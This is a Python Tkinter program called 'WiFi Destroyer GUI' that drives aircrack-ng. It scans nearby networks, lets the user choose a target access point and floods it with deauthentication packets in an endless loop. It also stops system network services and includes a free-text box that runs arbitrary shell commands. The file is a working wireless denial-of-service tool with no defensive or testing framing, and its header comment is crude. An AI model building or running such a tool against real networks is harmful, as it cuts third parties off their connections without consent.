#!/usr/bin/env python3
# WiFi Destroyer GUI - Python-Powered GUI! Suck my d+ck!

import os
import sys
import subprocess
import threading
import time
import re
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
from PIL import Image, ImageTk, ImageDraw, ImageFont
import io

class WiFiDestroyerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("WiFi Destroyer GUI - Python-Powered GUI!")
        self.root.geometry("800x600")
        self.root.resizable(True, True)
        self.root.configure(bg="#1e1e1e")
        
        # Set icon (create a simple one if none exists)
        self.set_icon()
        
        # Variables
        self.current_interface = ""
        self.current_channel = 1
        self.monitor_mode = False
        self.scan_file = "scan_results"
        self.target_bssid = ""
        self.target_essid = ""
        self.target_channel = ""
        self.deauth_process = None
        self.deauth_running = False
        
        # Create notebook for tabs
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Create tabs
        self.main_tab = ttk.Frame(self.notebook)
        self.scan_tab = ttk.Frame(self.notebook)
        self.attack_tab = ttk.Frame(self.notebook)
        self.tools_tab = ttk.Frame(self.notebook)
        
        self.notebook.add(self.main_tab, text="Main")
        self.notebook.add(self.scan_tab, text="Scan")
        self.notebook.add(self.attack_tab, text="Attack")
        self.notebook.add(self.tools_tab, text="Tools")
        
        # Setup tabs
        self.setup_main_tab()
        self.setup_scan_tab()
        self.setup_attack_tab()
        self.setup_tools_tab()
        
        # Start interface detection
        self.detect_interfaces()
        
    def set_icon(self):
        # Create a simple icon
        img = Image.new('RGB', (64, 64), color=(30, 30, 30))
        d = ImageDraw.Draw(img)
        d.ellipse((8, 8, 56, 56), fill=(255, 0, 0))
        d.text((10, 20), "WiFi", fill=(255, 255, 255))
        
        # Save as icon
        icon_path = "/tmp/wifi_destroyer_icon.png"
        img.save(icon_path)
        
        # Set as window icon
        try:
            self.root.iconphoto(True, ImageTk.PhotoImage(img))
        except:
            pass  # Ignore if icon setting fails
    
    def setup_main_tab(self):
        # Title
        title_frame = ttk.Frame(self.main_tab)
        title_frame.pack(fill="x", padx=10, pady=10)
        
        title_label = ttk.Label(title_frame, text="WiFi Destroyer GUI", 
                               font=("Arial", 16, "bold"))
        title_label.pack()
        
        # Status frame
        status_frame = ttk.LabelFrame(self.main_tab, text="Status")
        status_frame.pack(fill="x", padx=10, pady=5)
        
        self.interface_label = ttk.Label(status_frame, text="Interface: Not Selected")
        self.interface_label.pack(anchor="w", padx=5, pady=2)
        
        self.channel_label = ttk.Label(status_frame, text="Channel: 1")
        self.channel_label.pack(anchor="w", padx=5, pady=2)
        
        self.monitor_label = ttk.Label(status_frame, text="Monitor Mode: Inactive")
        self.monitor_label.pack(anchor="w", padx=5, pady=2)
        
        self.target_label = ttk.Label(status_frame, text="Target: Not Selected")
        self.target_label.pack(anchor="w", padx=5, pady=2)
        
        # Interface selection
        interface_frame = ttk.LabelFrame(self.main_tab, text="Interface Selection")
        interface_frame.pack(fill="x", padx=10, pady=5)
        
        self.interface_var = tk.StringVar()
        self.interface_combo = ttk.Combobox(interface_frame, textvariable=self.interface_var, 
                                          state="readonly")
        self.interface_combo.pack(fill="x", padx=5, pady=5)
        
        interface_buttons_frame = ttk.Frame(interface_frame)
        interface_buttons_frame.pack(fill="x", padx=5, pady=5)
        
        ttk.Button(interface_buttons_frame, text="Refresh Interfaces", 
                  command=self.detect_interfaces).pack(side="left", padx=5)
        ttk.Button(interface_buttons_frame, text="Select Interface", 
                  command=self.select_interface).pack(side="left", padx=5)
        
        # Channel selection
        channel_frame = ttk.LabelFrame(self.main_tab, text="Channel Selection")
        channel_frame.pack(fill="x", padx=10, pady=5)
        
        channel_control_frame = ttk.Frame(channel_frame)
        channel_control_frame.pack(fill="x", padx=5, pady=5)
        
        ttk.Label(channel_control_frame, text="Channel:").pack(side="left", padx=5)
        
        self.channel_var = tk.IntVar(value=1)
        self.channel_spinbox = ttk.Spinbox(channel_control_frame, from_=1, to=14, 
                                          textvariable=self.channel_var, width=5)
        self.channel_spinbox.pack(side="left", padx=5)
        
        ttk.Button(channel_control_frame, text="Set Channel", 
                  command=self.set_channel).pack(side="left", padx=5)
        
        # Monitor mode
        monitor_frame = ttk.LabelFrame(self.main_tab, text="Monitor Mode")
        monitor_frame.pack(fill="x", padx=10, pady=5)
        
        monitor_buttons_frame = ttk.Frame(monitor_frame)
        monitor_buttons_frame.pack(fill="x", padx=5, pady=5)
        
        ttk.Button(monitor_buttons_frame, text="Start Monitor Mode", 
                  command=self.start_monitor_mode).pack(side="left", padx=5)
        ttk.Button(monitor_buttons_frame, text="Stop Monitor Mode", 
                  command=self.stop_monitor_mode).pack(side="left", padx=5)
        
        # Exit button
        exit_frame = ttk.Frame(self.main_tab)
        exit_frame.pack(fill="x", padx=10, pady=10)
        
        ttk.Button(exit_frame, text="Exit", command=self.exit_app).pack(side="right")
    
    def setup_scan_tab(self):
        # Scan options
        scan_options_frame = ttk.LabelFrame(self.scan_tab, text="Scan Options")
        scan_options_frame.pack(fill="x", padx=10, pady=5)
        
        scan_type_frame = ttk.Frame(scan_options_frame)
        scan_type_frame.pack(fill="x", padx=5, pady=5)
        
        self.scan_type_var = tk.StringVar(value="current")
        ttk.Radiobutton(scan_type_frame, text="Current Channel Only", 
                        variable=self.scan_type_var, value="current").pack(side="left", padx=5)
        ttk.Radiobutton(scan_type_frame, text="All Channels", 
                        variable=self.scan_type_var, value="all").pack(side="left", padx=5)
        
        scan_button_frame = ttk.Frame(scan_options_frame)
        scan_button_frame.pack(fill="x", padx=5, pady=5)
        
        self.scan_button = ttk.Button(scan_button_frame, text="Start Scan", 
                                    command=self.start_scan)
        self.scan_button.pack(side="left", padx=5)
        
        self.stop_scan_button = ttk.Button(scan_button_frame, text="Stop Scan", 
                                         command=self.stop_scan, state="disabled")
        self.stop_scan_button.pack(side="left", padx=5)
        
        # Scan results
        results_frame = ttk.LabelFrame(self.scan_tab, text="Scan Results")
        results_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Create treeview for scan results
        columns = ("ESSID", "BSSID", "Channel", "Power")
        self.scan_tree = ttk.Treeview(results_frame, columns=columns, show="headings")
        
        # Define headings
        self.scan_tree.heading("ESSID", text="Network Name")
        self.scan_tree.heading("BSSID", text="BSSID")
        self.scan_tree.heading("Channel", text="Channel")
        self.scan_tree.heading("Power", text="Power")
        
        # Define columns
        self.scan_tree.column("ESSID", width=200)
        self.scan_tree.column("BSSID", width=150)
        self.scan_tree.column("Channel", width=80)
        self.scan_tree.column("Power", width=80)
        
        # Add scrollbar
        scrollbar = ttk.Scrollbar(results_frame, orient="vertical", command=self.scan_tree.yview)
        self.scan_tree.configure(yscrollcommand=scrollbar.set)
        
        self.scan_tree.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Buttons for scan results
        results_buttons_frame = ttk.Frame(results_frame)
        results_buttons_frame.pack(fill="x", padx=5, pady=5)
        
        ttk.Button(results_buttons_frame, text="Select Target", 
                  command=self.select_target_from_scan).pack(side="left", padx=5)
        ttk.Button(results_buttons_frame, text="Clear Results", 
                  command=self.clear_scan_results).pack(side="left", padx=5)
    
    def setup_attack_tab(self):
        # Target info
        target_frame = ttk.LabelFrame(self.attack_tab, text="Target Information")
        target_frame.pack(fill="x", padx=10, pady=5)
        
        self.target_info_label = ttk.Label(target_frame, text="No target selected")
        self.target_info_label.pack(anchor="w", padx=5, pady=5)
        
        # Attack options
        attack_options_frame = ttk.LabelFrame(self.attack_tab, text="Attack Options")
        attack_options_frame.pack(fill="x", padx=10, pady=5)
        
        # Packet count
        packet_frame = ttk.Frame(attack_options_frame)
        packet_frame.pack(fill="x", padx=5, pady=5)
        
        ttk.Label(packet_frame, text="Packet Count:").pack(side="left", padx=5)
        
        self.packet_count_var = tk.IntVar(value=10)
        packet_spinbox = ttk.Spinbox(packet_frame, from_=1, to=100, 
                                      textvariable=self.packet_count_var, width=10)
        packet_spinbox.pack(side="left", padx=5)
        
        # Attack buttons
        attack_buttons_frame = ttk.Frame(attack_options_frame)
        attack_buttons_frame.pack(fill="x", padx=5, pady=5)
        
        self.attack_button = ttk.Button(attack_buttons_frame, text="Start Attack", 
                                      command=self.start_attack)
        self.attack_button.pack(side="left", padx=5)
        
        self.stop_attack_button = ttk.Button(attack_buttons_frame, text="Stop Attack", 
                                           command=self.stop_attack, state="disabled")
        self.stop_attack_button.pack(side="left", padx=5)
        
        # Attack log
        log_frame = ttk.LabelFrame(self.attack_tab, text="Attack Log")
        log_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.attack_log = scrolledtext.ScrolledText(log_frame, height=10, 
                                                  state="disabled", bg="#1e1e1e", 
                                                  fg="#ffffff")
        self.attack_log.pack(fill="both", expand=True, padx=5, pady=5)
    
    def setup_tools_tab(self):
        # Tools frame
        tools_frame = ttk.LabelFrame(self.tools_tab, text="Tools")
        tools_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Interface troubleshooter
        troubleshoot_button = ttk.Button(tools_frame, text="Interface Troubleshooter", 
                                       command=self.troubleshoot_interfaces)
        troubleshoot_button.pack(fill="x", padx=5, pady=5)
        
        # Terminal
        terminal_frame = ttk.LabelFrame(self.tools_tab, text="Terminal")
        terminal_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.terminal = scrolledtext.ScrolledText(terminal_frame, height=15, 
                                                state="normal", bg="#1e1e1e", 
                                                fg="#ffffff")
        self.terminal.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Terminal buttons
        terminal_buttons_frame = ttk.Frame(terminal_frame)
        terminal_buttons_frame.pack(fill="x", padx=5, pady=5)
        
        ttk.Button(terminal_buttons_frame, text="Clear Terminal", 
                  command=self.clear_terminal).pack(side="left", padx=5)
        ttk.Button(terminal_buttons_frame, text="Run Command", 
                  command=self.run_command).pack(side="left", padx=5)
        
        # Command entry
        self.command_var = tk.StringVar()
        self.command_entry = ttk.Entry(terminal_buttons_frame, 
                                       textvariable=self.command_var)
        self.command_entry.pack(side="left", fill="x", expand=True, padx=5)
    
    def detect_interfaces(self):
        self.log_to_terminal("Detecting WiFi interfaces...")
        
        # Run command to get interfaces
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        interfaces = re.findall(r"wlan[0-9]+", result.stdout)
        
        # Add monitor mode interfaces
        result = subprocess.run(["ifconfig"], capture_output=True, text=True)
        monitor_interfaces = re.findall(r"wlan[0-9]+mon", result.stdout)
        
        # Combine and deduplicate
        all_interfaces = list(set(interfaces + monitor_interfaces))
        
        # Update combobox
        self.interface_combo['values'] = all_interfaces
        if all_interfaces:
            self.interface_combo.current(0)
            self.current_interface = all_interfaces[0]
            self.update_status()
            self.log_to_terminal(f"Found {len(all_interfaces)} interfaces: {', '.join(all_interfaces)}")
        else:
            self.log_to_terminal("No WiFi interfaces found!")
            messagebox.showerror("Error", "No WiFi interfaces found!")
    
    def select_interface(self):
        selected = self.interface_var.get()
        if selected:
            self.current_interface = selected
            self.update_status()
            self.log_to_terminal(f"Selected interface: {selected}")
            
            # Check if monitor mode
            if "mon" in selected:
                self.monitor_mode = True
            else:
                self.monitor_mode = False
                # Bring interface up if it's down
                result = subprocess.run(["ip", "link", "show", selected], capture_output=True, text=True)
                if "UP" not in result.stdout:
                    self.log_to_terminal(f"Bringing interface {selected} up...")
                    subprocess.run(["sudo", "ip", "link", "set", selected, "up"], check=True)
            self.update_status()
    
    def set_channel(self):
        if not self.current_interface:
            messagebox.showerror("Error", "No interface selected!")
            return
        
        channel = self.channel_var.get()
        if 1 <= channel <= 14:
            self.log_to_terminal(f"Setting channel to {channel} on {self.current_interface}")
            subprocess.run(["sudo", "iwconfig", self.current_interface, "channel", str(channel)], check=True)
            self.current_channel = channel
            self.update_status()
        else:
            messagebox.showerror("Error", "Invalid channel! Must be between 1 and 14.")
    
    def start_monitor_mode(self):
        if not self.current_interface:
            messagebox.showerror("Error", "No interface selected!")
            return
        
        if "mon" in self.current_interface:
            messagebox.showinfo("Info", "Interface already in monitor mode!")
            return
        
        self.log_to_terminal(f"Starting monitor mode on {self.current_interface}")
        
        # Stop NetworkManager and wpa_supplicant if running
        subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"], capture_output=True)
        subprocess.run(["sudo", "systemctl", "stop", "wpa_supplicant"], capture_output=True)
        
        # Kill interfering processes
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
        
        # Start monitor mode
        result = subprocess.run(["sudo", "airmon-ng", "start", self.current_interface], capture_output=True, text=True)
        
        # Check if monitor mode started
        monitor_interface = f"{self.current_interface}mon"
        if monitor_interface in result.stdout:
            self.current_interface = monitor_interface
            self.monitor_mode = True
            self.update_status()
            self.log_to_terminal(f"Monitor mode started! New interface: {monitor_interface}")
            
            # Update interface combobox
            self.detect_interfaces()
            self.interface_var.set(monitor_interface)
        else:
            messagebox.showerror("Error", "Failed to start monitor mode!")
    
    def stop_monitor_mode(self):
        if not self.current_interface:
            messagebox.showerror("Error", "No interface selected!")
            return
        
        if "mon" not in self.current_interface:
            messagebox.showinfo("Info", "Interface not in monitor mode!")
            return
        
        self.log_to_terminal(f"Stopping monitor mode on {self.current_interface}")
        
        # Stop monitor mode
        result = subprocess.run(["sudo", "airmon-ng", "stop", self.current_interface], capture_output=True, text=True)
        
        # Check if monitor mode stopped
        base_interface = self.current_interface.replace("mon", "")
        if base_interface in result.stdout:
            self.current_interface = base_interface
            self.monitor_mode = False
            self.update_status()
            self.log_to_terminal(f"Monitor mode stopped! New interface: {base_interface}")
            
            # Update interface combobox
            self.detect_interfaces()
            self.interface_var.set(base_interface)
        else:
            messagebox.showerror("Error", "Failed to stop monitor mode!")
    
    def start_scan(self):
        if not self.current_interface:
            messagebox.showerror("Error", "No interface selected!")
            return
        
        # Clear previous results
        self.clear_scan_results()
        
        # Disable scan button and enable stop button
        self.scan_button.config(state="disabled")
        self.stop_scan_button.config(state="normal")
        
        # Start scan in a separate thread
        scan_thread = threading.Thread(target=self._scan_networks)
        scan_thread.daemon = True
        scan_thread.start()
    
    def _scan_networks(self):
        try:
            scan_type = self.scan_type_var.get()
            
            if scan_type == "current":
                self.log_to_terminal(f"Scanning for networks on channel {self.current_channel}...")
                command = ["sudo", "airodump-ng", self.current_interface, 
                           "--channel", str(self.current_channel), 
                           "--output-format", "csv", "-w", self.scan_file]
            else:
                self.log_to_terminal("Scanning for networks on all channels...")
                command = ["sudo", "airodump-ng", self.current_interface, 
                           "--output-format", "csv", "-w", self.scan_file]
            
            # Start scan process
            self.scan_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Wait for scan to complete or be stopped
            while self.scan_process.poll() is None:
                time.sleep(0.1)
            
            # Process results
            self.process_scan_results()
            
        except Exception as e:
            self.log_to_terminal(f"Error during scan: {str(e)}")
            messagebox.showerror("Error", f"Scan failed: {str(e)}")
        finally:
            # Re-enable scan button and disable stop button
            self.scan_button.config(state="normal")
            self.stop_scan_button.config(state="disabled")
    
    def stop_scan(self):
        if hasattr(self, 'scan_process') and self.scan_process:
            self.log_to_terminal("Stopping scan...")
            self.scan_process.terminate()
            self.scan_process = None
            
            # Process results
            self.process_scan_results()
            
            # Re-enable scan button and disable stop button
            self.scan_button.config(state="normal")
            self.stop_scan_button.config(state="disabled")
    
    def process_scan_results(self):
        try:
            # Read scan results
            with open(f"{self.scan_file}-01.csv", "r") as f:
                lines = f.readlines()
            
            # Find where client data starts
            client_start = 0
            for i, line in enumerate(lines):
                if "Station MAC" in line:
                    client_start = i
                    break
            
            # Clear tree
            for item in self.scan_tree.get_children():
                self.scan_tree.delete(item)
            
            # Process network data (before client data)
            for line in lines[1:client_start-1]:  # Skip header line
                if line.strip():  # Skip empty lines
                    fields = line.split(',')
                    if len(fields) >= 14:  # Make sure we have enough fields
                        bssid = fields[0].strip()
                        # FIXED: ESSID is in field 13, not at the end!
                        essid = fields[13].strip()
                        if not essid:
                            essid = "Hidden Network"
                        
                        channel = fields[3].strip()
                        power = fields[8].strip()
                        
                        # Add to tree
                        self.scan_tree.insert("", "end", values=(essid, bssid, channel, power))
            
            self.log_to_terminal(f"Scan complete! Found {len(self.scan_tree.get_children())} networks.")
            
        except Exception as e:
            self.log_to_terminal(f"Error processing scan results: {str(e)}")
    
    def clear_scan_results(self):
        # Clear tree
        for item in self.scan_tree.get_children():
            self.scan_tree.delete(item)
        
        # Remove scan file if it exists
        if os.path.exists(f"{self.scan_file}-01.csv"):
            os.remove(f"{self.scan_file}-01.csv")
    
    def select_target_from_scan(self):
        selected_item = self.scan_tree.focus()
        if not selected_item:
            messagebox.showwarning("Warning", "No network selected!")
            return
        
        # Get values from selected item
        values = self.scan_tree.item(selected_item, "values")
        if len(values) >= 2:
            self.target_essid = values[0]
            self.target_bssid = values[1]
            self.target_channel = values[2]
            
            # Update target info
            self.update_target_info()
            
            # Ask if user wants to switch to target channel
            if self.target_channel != "N/A" and int(self.target_channel) != self.current_channel:
                result = messagebox.askyesno("Channel Change", 
                                            f"Switch to channel {self.target_channel}?")
                if result:
                    self.channel_var.set(int(self.target_channel))
                    self.set_channel()
            
            self.log_to_terminal(f"Selected target: {self.target_essid} ({self.target_bssid}) on channel {self.target_channel}")
            messagebox.showinfo("Success", f"Target selected: {self.target_essid}")
        else:
            messagebox.showerror("Error", "Invalid selection!")
    
    def start_attack(self):
        if not self.current_interface:
            messagebox.showerror("Error", "No interface selected!")
            return
        
        if not self.target_bssid:
            messagebox.showerror("Error", "No target selected!")
            return
        
        # Disable attack button and enable stop button
        self.attack_button.config(state="disabled")
        self.stop_attack_button.config(state="normal")
        
        # Clear attack log
        self.attack_log.config(state="normal")
        self.attack_log.delete(1.0, "end")
        self.attack_log.config(state="disabled")
        
        # Start attack in a separate thread
        attack_thread = threading.Thread(target=self._run_attack)
        attack_thread.daemon = True
        attack_thread.start()
    
    def _run_attack(self):
        try:
            packet_count = self.packet_count_var.get()
            
            self.log_to_attack_log(f"Starting deauth attack on {self.target_essid} ({self.target_bssid}) with {packet_count} packets...")
            
            # Run attack in a loop
            self.deauth_running = True
            while self.deauth_running:
                # Run aireplay-ng command
                result = subprocess.run(
                    ["sudo", "aireplay-ng", "--deauth", str(packet_count), 
                     "-a", self.target_bssid, self.current_interface],
                    capture_output=True, text=True
                )
                
                # Log output
                if result.stdout:
                    self.log_to_attack_log(result.stdout)
                if result.stderr:
                    self.log_to_attack_log(f"Error: {result.stderr}")
                
                # Sleep before next iteration
                time.sleep(1)
            
            self.log_to_attack_log("Attack stopped.")
            
        except Exception as e:
            self.log_to_attack_log(f"Error during attack: {str(e)}")
        finally:
            # Re-enable attack button and disable stop button
            self.attack_button.config(state="normal")
            self.stop_attack_button.config(state="disabled")
    
    def stop_attack(self):
        self.deauth_running = False
        self.log_to_attack_log("Stopping attack...")
    
    def log_to_attack_log(self, message):
        self.attack_log.config(state="normal")
        self.attack_log.insert("end", f"{time.strftime('%H:%M:%S')} - {message}\n")
        self.attack_log.see("end")
        self.attack_log.config(state="disabled")
    
    def update_target_info(self):
        self.target_info_label.config(text=f"ESSID: {self.target_essid}\nBSSID: {self.target_bssid}\nChannel: {self.target_channel}")
    
    def update_status(self):
        self.interface_label.config(text=f"Interface: {self.current_interface}")
        self.channel_label.config(text=f"Channel: {self.current_channel}")
        self.monitor_label.config(text=f"Monitor Mode: {'Active' if self.monitor_mode else 'Inactive'}")
        self.target_label.config(text=f"Target: {self.target_essid if self.target_essid else 'Not Selected'}")
    
    def troubleshoot_interfaces(self):
        self.log_to_terminal("Running interface troubleshooter...")
        
        # Check rfkill
        result = subprocess.run(["rfkill", "list"], capture_output=True, text=True)
        self.log_to_terminal(f"rfkill list:\n{result.stdout}")
        
        # Check kernel messages
        result = subprocess.run(["dmesg"], capture_output=True, text=True)
        wifi_messages = "\n".join([line for line in result.stdout.split('\n') if 'wlan' in line.lower() or 'wifi' in line.lower() or '802.11' in line.lower()][-10:])
        self.log_to_terminal(f"Kernel messages:\n{wifi_messages}")
        
        # Check loaded modules
        result = subprocess.run(["lsmod"], capture_output=True, text=True)
        wifi_modules = "\n".join([line for line in result.stdout.split('\n') if 'wifi' in line.lower() or 'wlan' in line.lower() or '802.11' in line.lower()])
        self.log_to_terminal(f"Loaded modules:\n{wifi_modules}")
        
        # Check NetworkManager status
        result = subprocess.run(["systemctl", "status", "NetworkManager"], capture_output=True, text=True)
        self.log_to_terminal(f"NetworkManager status:\n{result.stdout}")
        
        # Check wpa_supplicant status
        result = subprocess.run(["systemctl", "status", "wpa_supplicant"], capture_output=True, text=True)
        self.log_to_terminal(f"wpa_supplicant status:\n{result.stdout}")
        
        # Unblock rfkill devices
        subprocess.run(["sudo", "rfkill", "unblock", "all"], capture_output=True)
        self.log_to_terminal("Unblocked all rfkill devices.")
        
        # Detect interfaces again
        self.detect_interfaces()
    
    def clear_terminal(self):
        self.terminal.delete(1.0, "end")
    
    def run_command(self):
        command = self.command_var.get()
        if command:
            self.log_to_terminal(f"$ {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if result.stdout:
                self.log_to_terminal(result.stdout)
            if result.stderr:
                self.log_to_terminal(f"Error: {result.stderr}")
    
    def log_to_terminal(self, message):
        self.terminal.insert("end", f"{message}\n")
        self.terminal.see("end")
    
    def exit_app(self):
        if self.deauth_running:
            self.stop_attack()
        
        # Restart network services
        subprocess.run(["sudo", "systemctl", "start", "NetworkManager"], capture_output=True)
        subprocess.run(["sudo", "systemctl", "start", "wpa_supplicant"], capture_output=True)
        
        self.root.quit()

if __name__ == "__main__":
    root = tk.Tk()
    app = WiFiDestroyerGUI(root)
    root.mainloop()
